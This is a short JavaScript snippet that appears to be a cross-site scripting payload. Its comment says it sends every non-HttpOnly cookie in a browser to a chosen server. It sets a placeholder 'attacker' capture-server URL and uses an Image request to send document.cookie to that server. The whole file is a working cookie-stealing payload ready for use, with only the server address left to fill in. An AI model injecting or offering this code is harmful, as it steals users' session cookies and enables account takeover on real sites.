/*
 * Send all the non-http-only cookies in a browser to the specified target
 * server. Http-Only will make this less useful on modern browsers.
 */

var attacker = "<YOUR_CAP_SERVER_HERE>" + "/?d="; // Watch the leading slash.

/* Send a GET request to the attacker server. */
new Image().src = attacker + document.cookie;
